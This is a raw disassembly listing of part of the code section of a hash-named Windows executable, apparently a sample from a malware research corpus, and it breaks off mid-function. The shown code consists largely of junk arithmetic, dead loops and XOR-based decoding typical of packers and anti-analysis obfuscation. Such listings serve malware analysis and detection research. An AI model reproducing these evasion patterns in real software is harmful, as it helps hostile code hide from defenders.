
eaf819931d8e20357b9cafc5b20d4216ff0fcba82ced9f6e6f01ef16beab6a5b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	or     DWORD PTR ds:0x42c010,0x42b004
  401013:	push   edi
  401014:	adc    DWORD PTR ds:0x42c000,0x42b014
  40101e:	push   0x42e423
  401023:	dec    DWORD PTR ds:0x42a018
  401029:	xor    edi,edi
  40102b:	not    DWORD PTR ds:0x42901c
  401031:	inc    edi
  401032:	push   edi
  401033:	push   edi
  401034:	call   DWORD PTR ds:0x42e9c3
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42b01c,0x7587
  401046:	je     0x401075
  40104c:	lea    eax,[ebp-0x64]
  40104f:	not    DWORD PTR ds:0x42b004
  401055:	push   eax
  401056:	adc    DWORD PTR ds:0x42d00c,0x42d014
  401060:	call   DWORD PTR ds:0x42e98b
  401066:	mov    DWORD PTR ds:0x42a00c,0x7907
  401070:	jmp    0x4026aa
  401075:	sub    DWORD PTR ds:0x42a010,0x42a01c
  40107f:	push   esi
  401080:	mov    esi,DWORD PTR ds:0x42e9cf
  401086:	push   0x8
  401088:	sub    DWORD PTR ds:0x429004,0x42c000
  401092:	push   0x42e433
  401097:	sub    DWORD PTR ds:0x429000,0x1be5
  4010a1:	call   esi
  4010a3:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010ad:	test   eax,eax
  4010af:	mov    DWORD PTR ds:0x42b000,0x51df
  4010b9:	je     0x4010de
  4010bf:	lea    eax,[ebp-0x64]
  4010c2:	and    DWORD PTR ds:0x42d014,0x42a004
  4010cc:	push   eax
  4010cd:	inc    DWORD PTR ds:0x42d008
  4010d3:	call   DWORD PTR ds:0x42e98b
  4010d9:	jmp    0x4026a9
  4010de:	xor    DWORD PTR ds:0x42a008,0x429000
  4010e8:	push   ebx
  4010e9:	mov    ebx,DWORD PTR ds:0x42e99b
  4010ef:	add    DWORD PTR ds:0x429004,0x5c52
  4010f9:	push   0x42e443
  4010fe:	adc    DWORD PTR ds:0x42c014,0x42b014
  401108:	push   edi
  401109:	push   edi
  40110a:	and    DWORD PTR ds:0x429020,0x61d3
  401114:	call   ebx
  401116:	test   eax,eax
  401118:	mov    DWORD PTR ds:0x42b018,0x2d2c
  401122:	je     0x40115f
  401128:	sbb    DWORD PTR ds:0x42a010,0x429004
  401132:	lea    eax,[ebp-0x64]
  401135:	xor    DWORD PTR ds:0x42c000,0x429008
  40113f:	push   eax
  401140:	or     DWORD PTR ds:0x429000,0x4b22
  40114a:	call   DWORD PTR ds:0x42e98b
  401150:	mov    DWORD PTR ds:0x429004,0x6e7d
  40115a:	jmp    0x4026a8
  40115f:	push   0xc
  401161:	sbb    DWORD PTR ds:0x42d014,0x5298
  40116b:	push   0x42e467
  401170:	sbb    DWORD PTR ds:0x42c010,0x42c008
  40117a:	call   esi
  40117c:	dec    DWORD PTR ds:0x42d000
  401182:	test   eax,eax
  401184:	jne    0x401768
  40118a:	push   0x7
  40118c:	push   0x42e47b
  401191:	call   esi
  401193:	adc    DWORD PTR ds:0x429014,0x42900c
  40119d:	test   eax,eax
  40119f:	mov    DWORD PTR ds:0x42c000,0x2037
  4011a9:	jne    0x401768
  4011af:	push   0x8
  4011b1:	xor    DWORD PTR ds:0x42d010,0x429014
  4011bb:	push   0x42e48b
  4011c0:	and    DWORD PTR ds:0x42d010,0x7e73
  4011ca:	call   esi
  4011cc:	test   eax,eax
  4011ce:	mov    DWORD PTR ds:0x429014,0x43a5
  4011d8:	jne    0x401768
  4011de:	push   0x42e49b
  4011e3:	adc    DWORD PTR ds:0x429014,0x42b00c
  4011ed:	push   edi
  4011ee:	push   edi
  4011ef:	call   DWORD PTR ds:0x42e9c3
  4011f5:	xor    DWORD PTR ds:0x429008,0xc25
  4011ff:	test   eax,eax
  401201:	mov    DWORD PTR ds:0x42b004,0x1e9f
  40120b:	jne    0x401768
  401211:	sbb    DWORD PTR ds:0x42b008,0x42a01c
  40121b:	push   0x42e4ab
  401220:	push   edi
  401221:	sbb    DWORD PTR ds:0x42b000,0x42b018
  40122b:	push   edi
  40122c:	sbb    DWORD PTR ds:0x42a008,0x42c00c
  401236:	call   ebx
  401238:	adc    DWORD PTR ds:0x42a01c,0xefe
  401242:	test   eax,eax
  401244:	mov    DWORD PTR ds:0x42d014,0x5190
  40124e:	jne    0x401768
  401254:	sub    DWORD PTR ds:0x42b000,0x721d
  40125e:	push   0xc
  401260:	add    DWORD PTR ds:0x42d018,0x42c000
  40126a:	push   0x42e4cf
  40126f:	call   esi
  401271:	test   eax,eax
  401273:	mov    DWORD PTR ds:0x42a014,0x465b
  40127d:	jne    0x401768
  401283:	or     DWORD PTR ds:0x42d014,0x42900c
  40128d:	push   0x7
  40128f:	push   0x42e4e3
  401294:	xor    DWORD PTR ds:0x42c014,0x14b0
  40129e:	call   esi
  4012a0:	test   eax,eax
  4012a2:	mov    DWORD PTR ds:0x42a01c,0x4b6
  4012ac:	jne    0x401768
  4012b2:	push   0x8
  4012b4:	or     DWORD PTR ds:0x429028,0x429010
  4012be:	push   0x42e4f3
  4012c3:	sbb    DWORD PTR ds:0x42a010,0x429008
  4012cd:	call   esi
  4012cf:	test   eax,eax
  4012d1:	mov    DWORD PTR ds:0x42a00c,0x7915
  4012db:	jne    0x401768
  4012e1:	or     DWORD PTR ds:0x42b000,0xa15
  4012eb:	push   0x42e503
  4012f0:	push   edi
  4012f1:	sub    DWORD PTR ds:0x42901c,0x42c008
  4012fb:	push   edi
  4012fc:	xor    DWORD PTR ds:0x42a01c,0x42d010
  401306:	call   DWORD PTR ds:0x42e9c3
  40130c:	test   eax,eax
  40130e:	jne    0x401768
  401314:	sub    DWORD PTR ds:0x42d014,0x42a000
  40131e:	push   0x42e513
  401323:	adc    DWORD PTR ds:0x42b018,0x14c4
  40132d:	push   edi
  40132e:	xor    DWORD PTR ds:0x42c008,0x6706
  401338:	push   edi
  401339:	or     DWORD PTR ds:0x42a01c,0x6055
  401343:	call   ebx
  401345:	sub    DWORD PTR ds:0x429014,0x42b00c
  40134f:	test   eax,eax
  401351:	mov    DWORD PTR ds:0x42d00c,0x550a
  40135b:	jne    0x401768
  401361:	push   0xc
  401363:	push   0x42e537
  401368:	adc    DWORD PTR ds:0x42c00c,0x429018
  401372:	call   esi
  401374:	test   eax,eax
  401376:	mov    DWORD PTR ds:0x429024,0x758e
  401380:	jne    0x401768
  401386:	push   0x7
  401388:	adc    DWORD PTR ds:0x429010,0x1615
  401392:	push   0x42e54b
  401397:	sub    DWORD PTR ds:0x429008,0x42b01c
  4013a1:	call   esi
  4013a3:	adc    DWORD PTR ds:0x42c01c,0x7f54
  4013ad:	test   eax,eax
  4013af:	jne    0x401768
  4013b5:	or     DWORD PTR ds:0x429000,0x429008
  4013bf:	push   0x8
  4013c1:	sub    DWORD PTR ds:0x42a000,0x50c8
  4013cb:	push   0x42e55b
  4013d0:	call   esi
  4013d2:	xor    DWORD PTR ds:0x42a018,0x58f3
  4013dc:	test   eax,eax
  4013de:	mov    DWORD PTR ds:0x42a010,0x4d09
  4013e8:	jne    0x401768
  4013ee:	push   0x42e56b
  4013f3:	push   edi
  4013f4:	sbb    DWORD PTR ds:0x42c00c,0x429018
  4013fe:	push   edi
  4013ff:	call   DWORD PTR ds:0x42e9c3
  401405:	sbb    DWORD PTR ds:0x42d008,0x42d004
  40140f:	test   eax,eax
  401411:	mov    DWORD PTR ds:0x42a010,0xbaa
  40141b:	jne    0x401768
  401421:	push   0x42e57b
  401426:	push   edi
  401427:	push   edi
  401428:	call   ebx
  40142a:	sbb    DWORD PTR ds:0x42b000,0x429014
  401434:	test   eax,eax
  401436:	mov    DWORD PTR ds:0x42d008,0x1c53
  401440:	jne    0x401768
  401446:	adc    DWORD PTR ds:0x42a00c,0x429024
  401450:	push   0xc
  401452:	push   0x42e59f
  401457:	sbb    DWORD PTR ds:0x429028,0x2f15
  401461:	call   esi
  401463:	test   eax,eax
  401465:	mov    DWORD PTR ds:0x42d004,0x2bd4
  40146f:	jne    0x401768
  401475:	mov    DWORD PTR ds:0x42d014,0xc7e
  40147f:	push   0x7
  401481:	or     DWORD PTR ds:0x42b01c,0x629c
  40148b:	push   0x42e5b3
  401490:	call   esi
  401492:	xor    DWORD PTR ds:0x429020,0x42c014
  40149c:	test   eax,eax
  40149e:	mov    DWORD PTR ds:0x42b008,0x386
  4014a8:	jne    0x401768
  4014ae:	push   0x8
  4014b0:	push   0x42e5c3
  4014b5:	sub    DWORD PTR ds:0x429024,0x42a008
  4014bf:	call   esi
  4014c1:	sub    DWORD PTR ds:0x42b004,0x42c018
  4014cb:	test   eax,eax
  4014cd:	mov    DWORD PTR ds:0x42900c,0x6fc8
  4014d7:	jne    0x401768
  4014dd:	xor    DWORD PTR ds:0x42d010,0x42901c
  4014e7:	push   0x42e5d3
  4014ec:	and    DWORD PTR ds:0x42d014,0x50c
  4014f6:	push   edi
  4014f7:	push   edi
  4014f8:	sbb    DWORD PTR ds:0x42b000,0x3361
  401502:	call   DWORD PTR ds:0x42e9c3
  401508:	test   eax,eax
  40150a:	mov    DWORD PTR ds:0x42b008,0x5d56
  401514:	jne    0x401768
  40151a:	xor    DWORD PTR ds:0x42a000,0x4d69
  401524:	push   0x42e5e3
  401529:	and    DWORD PTR ds:0x429024,0x42a014
  401533:	push   edi
  401534:	or     DWORD PTR ds:0x42c004,0x3817
  40153e:	push   edi
  40153f:	add    DWORD PTR ds:0x429024,0x2571
  401549:	call   ebx
  40154b:	xor    DWORD PTR ds:0x429028,0x42b00c
  401555:	test   eax,eax
  401557:	mov    DWORD PTR ds:0x42b00c,0x17fe
  401561:	jne    0x401768
  401567:	mov    DWORD PTR ds:0x42c014,0x28c7
  401571:	push   0xc
  401573:	and    DWORD PTR ds:0x429024,0x5a57
  40157d:	push   0x42e607
  401582:	call   esi
  401584:	test   eax,eax
  401586:	mov    DWORD PTR ds:0x42b00c,0xc7e
  401590:	jne    0x401768
  401596:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015a0:	push   0x7
  4015a2:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015ac:	push   0x42e61b
  4015b1:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015bb:	call   esi
  4015bd:	xor    DWORD PTR ds:0x42c00c,0x55d5
  4015c7:	test   eax,eax
  4015c9:	jne    0x401768
  4015cf:	or     DWORD PTR ds:0x429008,0x62a0
  4015d9:	push   0x8
  4015db:	or     DWORD PTR ds:0x429020,0x42d018
  4015e5:	push   0x42e62b
  4015ea:	call   esi
  4015ec:	test   eax,eax
  4015ee:	mov    DWORD PTR ds:0x429010,0x43d8
  4015f8:	jne    0x401768
  4015fe:	push   0x42e63b
  401603:	sub    DWORD PTR ds:0x42a008,0x5452
  40160d:	push   edi
  40160e:	adc    DWORD PTR ds:0x42b004,0x3794
  401618:	push   edi
  401619:	add    DWORD PTR ds:0x42b018,0x429000
  401623:	call   DWORD PTR ds:0x42e9c3
  401629:	add    DWORD PTR ds:0x42b014,0x42c014
  401633:	test   eax,eax
  401635:	mov    DWORD PTR ds:0x42c010,0x9db
  40163f:	jne    0x401768
  401645:	add    DWORD PTR ds:0x42b01c,0x42c010
  40164f:	push   0x42e64b
  401654:	push   edi
  401655:	push   edi
  401656:	call   ebx
  401658:	test   eax,eax
  40165a:	jne    0x401768
  401660:	sub    DWORD PTR ds:0x42a010,0x42b00c
  40166a:	push   0xc
  40166c:	xor    DWORD PTR ds:0x42a000,0x46f8
  401676:	push   0x42e66f
  40167b:	sub    DWORD PTR ds:0x429028,0x1e37
  401685:	call   esi
  401687:	not    DWORD PTR ds:0x42b000
  40168d:	test   eax,eax
  40168f:	mov    DWORD PTR ds:0x42a010,0x1824
  401699:	jne    0x401768
  40169f:	push   0x7
  4016a1:	neg    DWORD PTR ds:0x42d004
  4016a7:	push   0x42e683
  4016ac:	call   esi
  4016ae:	xor    DWORD PTR ds:0x429020,0x5303
  4016b8:	test   eax,eax
  4016ba:	jne    0x401768
  4016c0:	sub    DWORD PTR ds:0x429014,0x42c01c
  4016ca:	push   0x8
  4016cc:	not    DWORD PTR ds:0x429000
  4016d2:	push   0x42e693
  4016d7:	or     DWORD PTR ds:0x42c01c,0x7461
  4016e1:	call   esi
  4016e3:	test   eax,eax
  4016e5:	jne    0x401768
  4016eb:	or     DWORD PTR ds:0x42b010,0x6614
  4016f5:	push   0x42e6a3
  4016fa:	push   edi
  4016fb:	and    DWORD PTR ds:0x42b01c,0x42a008
  401705:	push   edi
  401706:	call   DWORD PTR ds:0x42e9c3
  40170c:	sub    DWORD PTR ds:0x429010,0x42a018
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42b004,0x423f
  401722:	jne    0x401768
  401728:	push   0x42e6b3
  40172d:	and    DWORD PTR ds:0x42d014,0x5d3e
  401737:	push   edi
  401738:	push   edi
  401739:	call   ebx
  40173b:	sub    DWORD PTR ds:0x42a004,0x8003
  401745:	test   eax,eax
  401747:	jne    0x401768
  40174d:	push   0xc
  40174f:	push   0x42e6d7
  401754:	call   esi
  401756:	or     DWORD PTR ds:0x42a014,0x792e
  401760:	test   eax,eax
  401762:	je     0x401783
  401768:	add    DWORD PTR ds:0x42d004,0x429000
  401772:	xor    eax,eax
  401774:	mov    DWORD PTR ds:0x42c00c,0x1740
  40177e:	jmp    0x4026a8
  401783:	sub    DWORD PTR ds:0x42c01c,0x74ec
  40178d:	mov    DWORD PTR [ebp-0x10],0x0
  401794:	sub    edx,ecx
  401796:	mov    eax,DWORD PTR [ebp-0x34]
  401799:	adc    edx,DWORD PTR ds:0x42b004
  40179f:	mov    DWORD PTR [ebp-0x34],eax
  4017a2:	sub    edx,DWORD PTR ds:0x429024
  4017a8:	mov    ecx,0xf89c85b9
  4017ad:	xor    esi,esi
  4017af:	or     esi,DWORD PTR ds:0x42b018
  4017b5:	adc    DWORD PTR ds:0x429020,esi
  4017bb:	mov    DWORD PTR [ebp-0x8],ecx
  4017be:	mov    edx,DWORD PTR ds:0x42d004
  4017c4:	sbb    edx,DWORD PTR ds:0x42901c
  4017ca:	mov    DWORD PTR ds:0x42d004,edx
  4017d0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4017d7:	add    esi,edx
  4017d9:	lea    eax,[ebp-0x3c]
  4017dc:	xor    edx,edx
  4017de:	mov    DWORD PTR [ebp-0x30],eax
  4017e1:	lea    eax,[ebp-0x44]
  4017e4:	mov    DWORD PTR ds:0x42b00c,0x18
  4017ee:	cmp    DWORD PTR ds:0x42b00c,0x0
  4017f5:	je     0x40184f
  4017fb:	cmp    DWORD PTR ds:0x42b00c,0x7
  401802:	jne    0x40181d
  401808:	push   0x42b010
  40180d:	push   0x42c014
  401812:	push   0x42d004
  401817:	call   DWORD PTR ds:0x42e993
  40181d:	cmp    DWORD PTR ds:0x42b00c,0x8
  401824:	jne    0x401837
  40182a:	mov    esi,DWORD PTR ds:0x42b00c
  401830:	dec    esi
  401831:	mov    DWORD PTR ds:0x42b00c,esi
  401837:	mov    esi,DWORD PTR ds:0x42b00c
  40183d:	dec    esi
  40183e:	mov    DWORD PTR ds:0x42b00c,esi
  401844:	jmp    0x4017ee
  401849:	adc    DWORD PTR ds:0x429000,ebx
  40184f:	mov    DWORD PTR [ebp-0x18],eax
  401852:	mov    eax,ds:0x42e313
  401857:	and    DWORD PTR ds:0x429004,0x0
  401861:	jmp    0x401873
  401866:	mov    edi,DWORD PTR ds:0x429004
  40186c:	inc    edi
  40186d:	mov    DWORD PTR ds:0x429004,edi
  401873:	cmp    DWORD PTR ds:0x429004,0x1c
  40187a:	jae    0x4018a6
  401880:	cmp    DWORD PTR ds:0x429004,0x22
  401887:	jne    0x40189b
  40188d:	push   0x0
  40188f:	push   DWORD PTR [ebp-0x20]
  401892:	push   DWORD PTR [ebp-0x10]
  401895:	call   DWORD PTR ds:0x42e997
  40189b:	jmp    0x401866
  4018a0:	adc    DWORD PTR ds:0x42c018,ebx
  4018a6:	mov    eax,DWORD PTR [eax+0x1c8]
  4018ac:	mov    DWORD PTR ds:0x42a010,0x15
  4018b6:	cmp    DWORD PTR ds:0x42a010,0x0
  4018bd:	je     0x401923
  4018c3:	cmp    DWORD PTR ds:0x42a010,0xa
  4018ca:	jne    0x4018f1
  4018d0:	push   DWORD PTR [ebp-0x10]
  4018d3:	push   0x85d6
  4018d8:	push   0x42c01c
  4018dd:	push   DWORD PTR [ebp-0x24]
  4018e0:	push   DWORD PTR [ebp-0x18]
  4018e3:	push   0x61a0
  4018e8:	push   DWORD PTR [ebp-0x18]
  4018eb:	call   DWORD PTR ds:0x42e99f
  4018f1:	cmp    DWORD PTR ds:0x42a010,0xb
  4018f8:	jne    0x40190b
  4018fe:	mov    esi,DWORD PTR ds:0x42a010
  401904:	dec    esi
  401905:	mov    DWORD PTR ds:0x42a010,esi
  40190b:	mov    esi,DWORD PTR ds:0x42a010
  401911:	dec    esi
  401912:	mov    DWORD PTR ds:0x42a010,esi
  401918:	jmp    0x4018b6
  40191d:	and    DWORD PTR ds:0x42b000,edx
  401923:	mov    eax,DWORD PTR [eax]
  401925:	xor    DWORD PTR ds:0x42c01c,0x42d014
  40192f:	mov    edx,DWORD PTR [ebp-0x18]
  401932:	or     esi,DWORD PTR ds:0x42d014
  401938:	mov    esi,0x7510899
  40193d:	xor    eax,esi
  40193f:	mov    edi,0x3272e0
  401944:	add    eax,edi
  401946:	mov    DWORD PTR [edx],eax
  401948:	mov    DWORD PTR ds:0x42900c,0x4148
  401952:	mov    eax,ds:0x42e7c3
  401957:	cmp    eax,0x312bc9f6
  40195c:	mov    DWORD PTR ds:0x429010,0x7018
  401966:	jne    0x401abf
  40196c:	adc    DWORD PTR ds:0x42a018,0x1f6
  401976:	mov    eax,DWORD PTR [ebp-0x8]
  401979:	and    DWORD PTR ds:0x42d010,0x0
  401983:	jmp    0x401995
  401988:	mov    ebx,DWORD PTR ds:0x42d010
  40198e:	inc    ebx
  40198f:	mov    DWORD PTR ds:0x42d010,ebx
  401995:	cmp    DWORD PTR ds:0x42d010,0x1a
  40199c:	jae    0x4019d3
  4019a2:	cmp    DWORD PTR ds:0x42d010,0x1f
  4019a9:	jne    0x4019c8
  4019af:	push   0x42b018
  4019b4:	push   DWORD PTR [ebp-0x18]
  4019b7:	push   0x42e127
  4019bc:	push   DWORD PTR [ebp-0x24]
  4019bf:	push   DWORD PTR [ebp-0x14]
  4019c2:	call   DWORD PTR ds:0x42e9a3
  4019c8:	jmp    0x401988
  4019cd:	and    ebx,DWORD PTR ds:0x429020
  4019d3:	mov    edx,DWORD PTR ds:0x42e313
  4019d9:	sbb    DWORD PTR ds:0x42b000,edi
  4019df:	mov    edx,DWORD PTR [edx+0x198]
  4019e5:	inc    ebx
  4019e6:	xor    eax,esi
  4019e8:	movzx  ebx,WORD PTR ds:0x42b01c
  4019ef:	or     DWORD PTR ds:0x429014,ebx
  4019f5:	add    eax,edi
  4019f7:	sub    DWORD PTR ds:0x42b008,edx
  4019fd:	mov    DWORD PTR [edx],eax
  4019ff:	add    ebx,0x6ca
  401a05:	mov    eax,DWORD PTR [ebp-0x8]
  401a08:	mov    DWORD PTR ds:0x429008,0x1c
  401a12:	cmp    DWORD PTR ds:0x429008,0x0
  401a19:	je     0x401a65
  401a1f:	cmp    DWORD PTR ds:0x429008,0x9
  401a26:	jne    0x401a37
  401a2c:	push   0x42d004
  401a31:	call   DWORD PTR ds:0x42e9ab
  401a37:	cmp    DWORD PTR ds:0x429008,0xa
  401a3e:	jne    0x401a51
  401a44:	mov    ebx,DWORD PTR ds:0x429008
  401a4a:	dec    ebx
  401a4b:	mov    DWORD PTR ds:0x429008,ebx
  401a51:	xor    ebx,ebx
  401a53:	add    ebx,DWORD PTR ds:0x429008
  401a59:	dec    ebx
  401a5a:	mov    DWORD PTR ds:0x429008,ebx
  401a60:	jmp    0x401a12
  401a65:	xor    eax,esi
  401a67:	mov    DWORD PTR ds:0x42a010,0x13
  401a71:	cmp    DWORD PTR ds:0x42a010,0x0
  401a78:	je     0x401ab2
  401a7e:	cmp    DWORD PTR ds:0x42a010,0x23
  401a85:	jne    0x401a9e
  401a8b:	push   DWORD PTR [ebp-0xc]
  401a8e:	push   0x0
  401a90:	push   0x429028
  401a95:	push   DWORD PTR [ebp-0x1c]
  401a98:	call   DWORD PTR ds:0x42e9af
  401a9e:	mov    ebx,DWORD PTR ds:0x42a010
  401aa4:	dec    ebx
  401aa5:	mov    DWORD PTR ds:0x42a010,ebx
  401aab:	jmp    0x401a71
  401ab0:	not    ebx
  401ab2:	add    eax,edi
  401ab4:	xor    DWORD PTR ds:0x42900c,ecx
  401aba:	mov    ds:0x42e7c3,eax
  401abf:	xor    DWORD PTR ds:0x42c010,0x7580
  401ac9:	mov    eax,ds:0x42e313
  401ace:	and    DWORD PTR ds:0x42d018,0x0
  401ad8:	mov    ebx,DWORD PTR ds:0x42d018
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x42d018,ebx
  401ae5:	cmp    DWORD PTR ds:0x42d018,0x4
  401aec:	jne    0x401af8
  401af2:	call   DWORD PTR ds:0x42e9b3
  401af8:	cmp    DWORD PTR ds:0x42d018,0x3
  401aff:	jne    0x401b12
  401b05:	mov    ebx,DWORD PTR ds:0x42d018
  401b0b:	inc    ebx
  401b0c:	mov    DWORD PTR ds:0x42d018,ebx
  401b12:	cmp    DWORD PTR ds:0x42d018,0x1f
  401b19:	jb     0x401ad8
  401b1f:	add    DWORD PTR ds:0x42a000,0x4980
  401b29:	mov    eax,DWORD PTR [eax+0x18c]
  401b2f:	mov    eax,DWORD PTR [eax]
  401b31:	mov    DWORD PTR [ebp-0x7c],eax
  401b34:	or     DWORD PTR ds:0x42c014,ebx
  401b3a:	mov    ebx,0xf89c85bd
  401b3f:	mov    DWORD PTR [ebp-0x10],ebx
  401b42:	mov    DWORD PTR [ebp-0x10],ebx
  401b45:	add    eax,0x7960
  401b4a:	mov    DWORD PTR [ebp-0x10],ebx
  401b4d:	or     eax,DWORD PTR ds:0x42c000
  401b53:	mov    DWORD PTR [ebp-0x18],ecx
  401b56:	mov    DWORD PTR ds:0x429000,0x1d
  401b60:	cmp    DWORD PTR ds:0x429000,0x0
  401b67:	je     0x401c18
  401b6d:	cmp    DWORD PTR ds:0x429000,0xf
  401b74:	jne    0x401b9a
  401b7a:	push   DWORD PTR [ebp-0x18]
  401b7d:	push   0x429020
  401b82:	push   0x22ca
  401b87:	push   0x6383
  401b8c:	push   DWORD PTR [ebp-0x18]
  401b8f:	push   0x7f4f
  401b94:	call   DWORD PTR ds:0x42e9b7
  401b9a:	cmp    DWORD PTR ds:0x429000,0x10
  401ba1:	jne    0x401bb2
  401ba7:	mov    eax,ds:0x429000
  401bac:	dec    eax
  401bad:	mov    ds:0x429000,eax
  401bb2:	mov    eax,ds:0x429000
  401bb7:	dec    eax
  401bb8:	mov    ds:0x429000,eax
  401bbd:	jmp    0x401b60
  401bc2:	and    DWORD PTR ds:0x42a000,0x0
  401bcc:	xor    eax,eax
  401bce:	add    eax,DWORD PTR ds:0x42a000
  401bd4:	inc    eax
  401bd5:	mov    ds:0x42a000,eax
  401bda:	cmp    DWORD PTR ds:0x42a000,0xd
  401be1:	jne    0x401bed
  401be7:	call   DWORD PTR ds:0x42e9bb
  401bed:	cmp    DWORD PTR ds:0x42a000,0xc
  401bf4:	jne    0x401c05
  401bfa:	mov    eax,ds:0x42a000
  401bff:	inc    eax
  401c00:	mov    ds:0x42a000,eax
  401c05:	cmp    DWORD PTR ds:0x42a000,0x18
  401c0c:	jb     0x401bcc
  401c12:	or     DWORD PTR ds:0x42c008,ebx
  401c18:	mov    DWORD PTR [ebp-0x10],ebx
  401c1b:	xor    DWORD PTR ds:0x42c000,edx
  401c21:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  401c28:	mov    eax,DWORD PTR [ebp-0x8]
  401c2b:	xor    eax,esi
  401c2d:	or     DWORD PTR ds:0x42d000,0x4414
  401c37:	add    eax,edi
  401c39:	mov    DWORD PTR ds:0x429018,0x61ad
  401c43:	jmp    0x401d03
  401c48:	and    DWORD PTR ds:0x42b018,0x0
  401c52:	xor    ecx,ecx
  401c54:	add    ecx,DWORD PTR ds:0x42b018
  401c5a:	inc    ecx
  401c5b:	mov    DWORD PTR ds:0x42b018,ecx
  401c61:	cmp    DWORD PTR ds:0x42b018,0x29
  401c68:	jne    0x401c81
  401c6e:	push   DWORD PTR [ebp-0x24]
  401c71:	push   0x42c018
  401c76:	push   0x8c2e
  401c7b:	call   DWORD PTR ds:0x42e9bf
  401c81:	cmp    DWORD PTR ds:0x42b018,0x19
  401c88:	jb     0x401c52
  401c8e:	mov    eax,DWORD PTR [ebp-0xc]
  401c91:	adc    ecx,DWORD PTR ds:0x42b000
  401c97:	mov    ecx,DWORD PTR [ebp-0x1c]
  401c9a:	xor    eax,esi
  401c9c:	lea    eax,[eax+ecx*1+0x3272e0]
  401ca3:	push   eax
  401ca4:	mov    eax,DWORD PTR [ebp-0x18]
  401ca7:	or     DWORD PTR ds:0x42c01c,0x6aa9
  401cb1:	xor    eax,esi
  401cb3:	add    DWORD PTR ds:0x42d014,0x21f
  401cbd:	lea    eax,[ebp+eax*1+0x3272e8]
  401cc4:	or     DWORD PTR ds:0x42d004,0x505e
  401cce:	push   eax
  401ccf:	adc    DWORD PTR ds:0x42c01c,ecx
  401cd5:	mov    eax,ds:0x42e313
  401cda:	push   DWORD PTR [eax+0x1bc]
  401ce0:	sbb    DWORD PTR ds:0x42d004,0x7640
  401cea:	call   0x4026bd
  401cef:	xor    eax,0x743a
  401cf4:	mov    eax,DWORD PTR [ebp-0xc]
  401cf7:	mov    ecx,DWORD PTR [ebp-0x1c]
  401cfa:	xor    eax,esi
  401cfc:	lea    eax,[ecx+eax*1+0x3272e0]
  401d03:	mov    ecx,DWORD PTR [ebp-0xc]
  401d06:	not    edx
  401d08:	mov    edx,DWORD PTR [ebp-0xc]
  401d0b:	sbb    DWORD PTR ds:0x42c008,0x6696
  401d15:	xor    edx,esi
  401d17:	xor    ecx,esi
  401d19:	sub    DWORD PTR ds:0x42c014,0x5039
  401d23:	add    ecx,edx
  401d25:	mov    edx,DWORD PTR [ebp-0xc]
  401d28:	xor    edx,esi
  401d2a:	mov    DWORD PTR ds:0x42d004,0x46d7
  401d34:	lea    ecx,[ecx+edx*1+0x9758a0]
  401d3b:	mov    DWORD PTR [ebp-0x1c],eax
  401d3e:	cmp    eax,ecx
  401d40:	mov    DWORD PTR ds:0x42c01c,0x3624
  401d4a:	jbe    0x401c48
  401d50:	mov    DWORD PTR ds:0x42a018,0x1f
  401d5a:	cmp    DWORD PTR ds:0x42a018,0x0
  401d61:	je     0x401db7
  401d67:	cmp    DWORD PTR ds:0x42a018,0xc
  401d6e:	jne    0x401d89
  401d74:	push   0x42e127
  401d79:	push   0x42e139
  401d7e:	push   0x400000
  401d83:	call   DWORD PTR ds:0x42e9c7
  401d89:	cmp    DWORD PTR ds:0x42a018,0xd
  401d90:	jne    0x401da1
  401d96:	mov    eax,ds:0x42a018
  401d9b:	dec    eax
  401d9c:	mov    ds:0x42a018,eax
  401da1:	mov    eax,ds:0x42a018
  401da6:	dec    eax
  401da7:	mov    ds:0x42a018,eax
  401dac:	jmp    0x401d5a
  401db1:	sbb    ecx,0x5e3
  401db7:	mov    eax,DWORD PTR [ebp+0xc]
  401dba:	dec    ecx
  401dbb:	mov    ds:0x42e197,eax
  401dc0:	mov    DWORD PTR ds:0x42c010,0x5070
  401dca:	mov    eax,DWORD PTR [ebp+0x10]
  401dcd:	and    DWORD PTR ds:0x42b000,0x0
  401dd7:	mov    ecx,DWORD PTR ds:0x42b000
  401ddd:	inc    ecx
  401dde:	mov    DWORD PTR ds:0x42b000,ecx
  401de4:	cmp    DWORD PTR ds:0x42b000,0x22
  401deb:	jne    0x401dfc
  401df1:	push   0x42e000
  401df6:	call   DWORD PTR ds:0x42e9cb
  401dfc:	cmp    DWORD PTR ds:0x42b000,0x18
  401e03:	jb     0x401dd7
  401e09:	mov    ds:0x42e3eb,eax
  401e0e:	mov    eax,ds:0x42e197
  401e13:	add    DWORD PTR ds:0x42a010,ebx
  401e19:	mov    ecx,DWORD PTR [ebp-0x30]
  401e1c:	and    DWORD PTR ds:0x42900c,0x4f3f
  401e26:	sub    eax,edi
  401e28:	xor    DWORD PTR ds:0x42a018,0x42a01c
  401e32:	xor    eax,esi
  401e34:	mov    DWORD PTR [ecx],eax
  401e36:	movzx  eax,BYTE PTR ds:0x42900c
  401e3d:	mov    eax,DWORD PTR [ebp-0x34]
  401e40:	cmp    eax,0xf89c85b9
  401e45:	mov    DWORD PTR ds:0x42901c,0x22d7
  401e4f:	jne    0x402106
  401e55:	lea    eax,[ebp-0x40]
  401e58:	mov    DWORD PTR [ebp-0x9c],eax
  401e5e:	or     DWORD PTR ds:0x429028,0x42a008
  401e68:	lea    eax,[ebp+0x4]
  401e6b:	add    DWORD PTR ds:0x42a014,0x42c008
  401e75:	mov    DWORD PTR [ebp-0x40],eax
  401e78:	mov    eax,DWORD PTR [ebp-0x40]
  401e7b:	test   eax,eax
  401e7d:	mov    DWORD PTR ds:0x42b000,0x1a3e
  401e87:	je     0x40268d
  401e8d:	xor    ecx,0x3b66
  401e93:	mov    eax,DWORD PTR [ebp-0x24]
  401e96:	and    DWORD PTR ds:0x429028,0x0
  401ea0:	jmp    0x401eb2
  401ea5:	mov    ecx,DWORD PTR ds:0x429028
  401eab:	inc    ecx
  401eac:	mov    DWORD PTR ds:0x429028,ecx
  401eb2:	cmp    DWORD PTR ds:0x429028,0x14
